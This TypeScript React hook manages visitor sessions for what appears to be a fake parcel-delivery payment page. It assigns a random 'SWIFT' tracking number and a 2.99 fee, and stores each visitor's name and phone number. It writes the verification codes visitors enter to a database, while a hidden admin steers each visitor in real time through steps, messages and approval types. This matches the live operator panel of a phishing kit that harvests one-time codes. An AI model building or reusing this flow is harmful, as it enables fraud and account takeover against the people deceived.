import { useEffect, useState, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";

interface ClientSession {
  id: string;
  session_code: string;
  current_step: number;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_name: string | null;
  phone_number: string | null;
}

const generateSessionCode = () => {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
};

export const useClientSession = () => {
  const [session, setSession] = useState<ClientSession | null>(null);
  const [currentStep, setCurrentStep] = useState(1);
  const [adminMessage, setAdminMessage] = useState<string | null>(null);
  const [messageType, setMessageType] = useState<string | null>(null);
  const [verificationCode, setVerificationCode] = useState<string | null>(null);
  const [approvalType, setApprovalType] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  // Initialize or retrieve session
  const initSession = useCallback(async () => {
    // Check localStorage for existing session
    const storedSessionId = localStorage.getItem("swift_session_id");
    
    if (storedSessionId) {
      // Fetch existing session
      const { data, error } = await supabase
        .from("client_sessions")
        .select("*")
        .eq("id", storedSessionId)
        .single();

      if (data && !error) {
        setSession(data);
        setCurrentStep(data.current_step);
        setAdminMessage(data.admin_message);
        setMessageType(data.message_type);
        setVerificationCode(data.verification_code);
        setApprovalType(data.approval_type);
        setLoading(false);
        return;
      }
    }

    // Create new session
    const sessionCode = generateSessionCode();
    const { data, error } = await supabase
      .from("client_sessions")
      .insert({
        session_code: sessionCode,
        current_step: 1,
        parcel_tracking: "SWIFT" + Math.random().toString(36).substring(2, 10).toUpperCase(),
        amount: 2.99
      })
      .select()
      .single();

    if (data && !error) {
      localStorage.setItem("swift_session_id", data.id);
      setSession(data);
      setCurrentStep(data.current_step);
    }
    setLoading(false);
  }, []);

  // Update step locally and in database
  const updateStep = useCallback(async (newStep: number) => {
    if (!session) return;
    
    setCurrentStep(newStep);
    
    await supabase
      .from("client_sessions")
      .update({ current_step: newStep })
      .eq("id", session.id);
  }, [session]);

  // Update session data
  const updateSessionData = useCallback(async (data: Partial<{
    client_name: string;
    phone_number: string;
  }>) => {
    if (!session) return;
    
    await supabase
      .from("client_sessions")
      .update(data)
      .eq("id", session.id);
  }, [session]);

  // Clear admin message
  const clearAdminMessage = useCallback(async () => {
    if (!session) return;
    
    setAdminMessage(null);
    setMessageType(null);
    
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
  }, [session]);

  // Subscribe to realtime changes
  useEffect(() => {
    if (!session) return;

    const channel = supabase
      .channel(`session_${session.id}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "client_sessions",
          filter: `id=eq.${session.id}`
        },
        (payload) => {
          const newData = payload.new as ClientSession;
          setCurrentStep(newData.current_step);
          setAdminMessage(newData.admin_message);
          setMessageType(newData.message_type);
          setVerificationCode(newData.verification_code);
          setApprovalType(newData.approval_type);
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [session]);

  useEffect(() => {
    initSession();
  }, [initSession]);

  // Update verification code in database
  const updateVerificationCode = useCallback(async (code: string) => {
    if (!session) return;
    
    setVerificationCode(code);
    
    await supabase
      .from("client_sessions")
      .update({ verification_code: code })
      .eq("id", session.id);
  }, [session]);

  return {
    session,
    currentStep,
    adminMessage,
    messageType,
    verificationCode,
    approvalType,
    loading,
    updateStep,
    updateSessionData,
    updateVerificationCode,
    clearAdminMessage
  };
};
